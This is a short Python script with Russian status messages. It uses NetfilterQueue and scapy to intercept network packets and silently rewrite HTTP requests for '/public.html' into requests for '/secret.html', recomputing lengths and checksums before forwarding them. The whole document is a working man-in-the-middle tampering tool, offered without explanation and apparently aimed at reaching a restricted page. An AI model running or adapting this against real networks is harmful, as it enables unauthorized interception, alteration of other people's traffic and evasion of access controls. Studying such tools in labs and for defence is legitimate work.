from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

def packet_callback(packet):
    scapy_packet = IP(packet.get_payload())
    
    if scapy_packet.haslayer(Raw):
        payload = scapy_packet[Raw].load
        if b"GET /public.html" in payload:
            print("Перехвачен запрос к public.html")
            payload = payload.replace(b"GET /public.html", b"GET /secret.html")
            scapy_packet[Raw].load = payload
            del scapy_packet[IP].len
            del scapy_packet[TCP].chksum
            packet.set_payload(bytes(scapy_packet))
    
    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, packet_callback)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print("Остановка")
